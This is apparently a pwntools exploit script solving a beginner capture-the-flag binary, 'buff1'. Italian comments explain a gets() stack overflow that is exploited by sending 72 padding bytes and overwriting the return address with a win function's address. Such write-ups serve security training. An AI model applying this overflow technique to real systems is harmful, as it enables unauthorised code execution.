#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=buff1.chals.beginner.havce.it' '--port=31337' buff1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('buff1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'buff1.chals.beginner.havce.it'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
# la vulnerabilità è un buffer overflow sulla gets(name) infatti gets prende input finche non trova un \n non controllando la dimensione del buffer da riempire
# per questo bisogna mandare 72 bytes di garbage per rempire lo stack poi successivamente andare a sovrascrivere
#il return address con l'indirizzo della function win che era visibile trammite gdb eseguendo il comando gdb: info funtions 
#0x0000000000400786

payload=flat(                                           
    b'A'*72,
    p64(0x0000000000400786)
)
io.sendline(payload)


io.interactive()

